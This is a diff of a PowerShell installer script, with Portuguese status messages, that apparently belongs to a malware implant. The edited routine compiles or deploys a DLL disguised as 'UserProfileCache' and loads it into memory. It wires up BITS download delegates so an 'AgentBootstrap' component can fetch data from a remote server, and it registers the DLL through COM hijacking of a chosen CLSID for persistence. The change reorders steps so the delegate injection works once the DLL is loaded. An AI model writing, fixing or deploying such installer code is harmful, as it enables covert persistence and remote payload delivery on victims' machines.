@@ -1567,20 +1567,7 @@ function Invoke-InstallAction {
     if (-not $Config) { throw "Install requer -Config." }
     if (-not $Clsid) { throw "Install requer -Clsid." }
 
-    $delegateString = [Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
-    [UserProfileCache.ConfigClient]::DownloadStringWithBits = $delegateString
-
-    $delegateData = [Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
-    [UserProfileCache.AgentBootstrap]::DownloadDataWithBits = $delegateData
-
-    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
-    if ($existing -and $existing.DllExists -and -not $Force) {
-        Write-Host 'Ja instalado.'
-        return
-    }
-
-    Write-Host 'Instalando...'
-
+    Write-Host "Baixando configuracao..."
     $serverBase = Get-ServerUrl -Url $Config
 
     $destDll = Get-InstallDllPath
@@ -1589,19 +1576,31 @@ function Invoke-InstallAction {
         New-Item -ItemType Directory -Path $installDir -Force | Out-Null
     }
 
+    Write-Host "Compilando DLL..."
     Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
 
     if ($SourceDll) {
         if (-not (Test-Path $SourceDll -PathType Leaf)) {
             throw "SourceDll nao encontrada: $SourceDll"
         }
-
         Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
     }
     else {
         Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
     }
 
+    Write-Host "Carregando DLL compilada..."
+    # Carrega a DLL para acessar os tipos
+    [System.Reflection.Assembly]::LoadFile($destDll) | Out-Null
+
+    # Agora injeta os delegates APÓS a DLL estar carregada
+    $delegateString = [Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
+    [UserProfileCache.ConfigClient]::DownloadStringWithBits = $delegateString
+
+    $delegateData = [Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
+    [UserProfileCache.AgentBootstrap]::DownloadDataWithBits = $delegateData
+
+    Write-Host "Registrando COM hijack..."
     $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
 
     $agentId = [guid]::NewGuid().ToString('N')
